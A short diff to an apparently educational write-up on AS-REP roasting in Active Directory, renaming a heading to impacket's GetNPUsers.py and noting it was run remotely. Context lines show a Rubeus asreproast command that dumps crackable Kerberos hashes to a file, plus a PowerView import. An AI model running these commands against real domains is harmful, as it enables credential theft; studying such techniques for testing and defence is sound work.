@@ -65,7 +65,9 @@ Rubeus.exe asreproast /format:john /outfile:hash.txt
 
 <img src="/img/asrep/save.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-## ASREP Roasting with  GetUserSPNs.py
+## ASREP Roasting with  GetNPUsers.py
+I used GetNPUsers from impacket collection from a remote machine
+
 Get Domain User
 ```
 Import-Module .\powerview.ps1
